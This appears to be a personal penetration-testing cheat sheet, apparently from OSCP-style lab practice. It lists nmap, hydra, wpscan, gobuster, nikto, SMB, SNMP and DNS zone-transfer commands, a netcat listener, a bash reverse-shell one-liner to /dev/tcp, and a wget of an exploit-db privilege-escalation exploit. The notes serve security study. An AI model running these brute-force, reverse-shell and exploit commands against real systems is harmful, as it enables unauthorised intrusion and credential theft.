------------------------------------
# Terminal recording
start recording:
    
    script -a meine_session.txt

stop recording:

    exist


------------------------------------
# Scanning with Nmap
## Setting IP in Variable

    export RHOST=""

## Full Scan Nmap:

     sudo nmap -Pn -sS -p - -vv "$RHOST" | tee fullscan.nmap 


## Service Scan

    nmap -Pn -sV -p 21,22,25,80 -vv "$RHOST" | tee servicescan.nmap 

## Vulnerability Scan

    nmap -Pn -sC -vv -p 80 "$RHOST" | tee vulnscan.nmap 

## Agressive Scan
    
    nmap -p- -A "$RHOST" | tee agressivescan.nmap 



-------------------------------------
# Brute Force 
## hydra
you can also use ssh://
-l Username
-L File with Usernames
-t threads, default: 16, max: 64
-P Wordlist


    hydra -l john -P /usr/share/wordlists/rockyou.txt -t 6 ftp://192.168.56.105 | tee bruteforce.hydra

    hydra -L <username_list_file.ext> -P /usr/share/wordlists/rockyou.txt -o <output_file.ext> <service>:<server> -F



## gobuster
Gobuster is a tool used to brute-force: URIs (directories and files) in web sites, DNS subdomains (with wildcard support), Virtual Host names on target web servers, Open Amazon S3 buckets, Open Google Cloud buckets and TFTP servers.

    gobuster dir -k -u http://"$RHOST" -w /usr/share/dirb/wordlists/common.txt -e | tee bruteforce.gobuster

------------------------------------
# Web Content and Vulnerabilities

## nikto
Webserver Scanner which performs comprehensive tests against webservers

    nikto -h "$RHOST" | tee webserver.nikto

with port:

    nikto -h "$RHOST" -p [PORT] | tee webserver_[PORT].nikto


## dirb
Web Content Scanner. It looks for existing Web Objects


    dirb http://"$RHOST" | tee webcontentscan.dirb

With port:

    dirb http://"$RHOST":[Port]/ | tee webcontenscan_[port].dirb



## enum4linux
Simple wrapper around the tools in the samba package.

    enum4linux -a "$RHOST" | tee samba.enum4linux &
	
With Port:

    enum4linux -a "$RHOST" -p [port] | tee samba_[port].enum4linux &
    
## snmpwalk

    snmpwalk -v 2c -c public 10.0.2.6 | tee snmpwalk_10.0.2.6


## smbclient

    smbclient //"$RHOST"/kathy

Get Data from smbclient:
    
    mget *

## Dont forget to check **ssh** and **ftp**

    ssh "$RHOST"


It exists an user "anonymous" with password = "" (empty)
    
    ftp "$RHOST"


------------------------------------
# WPScan


    wpscan --url http://"$RHOST":[port]/wordpress --enumerate p,u | tee wpscan_http_[port]

getting a password for a user:

   wpscan -u https://"$RHOST"/wordpress/ --username John --wordlist /usr/share/wordlists/rockyou.txt

Infos:

    - Plugins for wordpress are under the wp-content directory.



------------------------------------
# SSL/TLS Konfiguration und Zertifikate
SSLSCAN:
 
    sslscan http://"$RHOST"

TESTSSL:

    testssl http://"$RHOST"
    
------------------------------------
# Reverse Shell
Change IP to Host IP (eth1) in reverse shell
Listen on Port "1234"
        
        sudo nc -nlvp 1234
    
Start reverse shell

------------------------------------
# What to do after getting local access?

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html

   * Use enumeration script like LinEnum 
   * search for an exploit to get root
   * get exploit on vul machine:

             wget https://www.exploit-db.com/download/36746.c


------------------------------------
# NSE Scrips
    
    ls /usr/share/nmap/scripts/http-*
 
# DNS Enumeration Script:
    nmap -sSU -p 53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=example.com 10.0.2.6

# http Enumeration Script:
    nmap -sV --script=/usr/share/nmap/scripts/http-enum 10.0.2.6 | tee nmap_http-enum_sV_10.0.2.6

# Linenum





------------------------------------
# Usefull Linux commands
show current working directory:
    
    pwd


Information about the system:
    
    uname -a

     
Try to get an interactive Shell:

    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1


Upgrade Shell:

    python -c'import pty;pty.spawn("/bin/bash");'


------------------------------------
# Show information of a NetBIOS Server

     nbtscan "$RHOST"


# Server Message Block Protocol:

    Port TCP/UDP 137-139 und TCP 445

    nbtscan targetIP | tee nbtscan_targetIP

    nbtscan 10.0.2.6 | tee nbtscan_10.0.2.6



# Host Zonetranfer:

    host zonetransfer.me DNS 
    DOM=zonetransfer.me; for srv in $(host -t ns ${DOM} | cut -d " " -f4); do
    host -l ${DOM} ${srv} | grep "has address"; done | tee host_zonetransfer.me

    dig DNS [S2F33/49]
    dig 10.0.2.6 | tee dig_10.0.2.6

    dig targetIP/targetHostname | tee dig_targetIP/targetHostname


    dig +short ns zonetransfer.me
    dig +short ns 10.0.2.6
    dig +short ns targetIP/Hostname

    The resulting hostname can be used in:
    dig axfr targetIP/Hostname @nameserverIP/Hostname
    dig axfr zonetransfer.me @nsztm1.digi.ninja.

    from: https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/
    https://hackertarget.com/zone-transfer/
    https://digi.ninja/projects/zonetransferme.php

    DNSRecon [S2F33/49]
    dnsrecon -d targetIP/Hostname -t axfr | tee

    dnsrecon_targetIP/Hostname

    dnsrecon -d 10.0.2.6 -t axfr | tee dnsrecon_10.0.2.6



